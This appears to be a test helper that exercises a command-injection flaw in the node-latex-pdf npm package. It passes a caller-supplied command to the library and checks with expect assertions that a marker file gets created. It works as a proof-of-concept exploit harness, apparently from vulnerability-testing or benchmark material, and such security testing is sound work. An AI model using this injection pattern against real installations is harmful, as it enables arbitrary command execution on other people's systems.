function exploitFunction(command) {
  const a = require("node-latex-pdf");
  const fs = require("fs");
  const path = "./node-latex-pdf";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  a("./", command, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
  });
}

module.exports = { exploitFunction };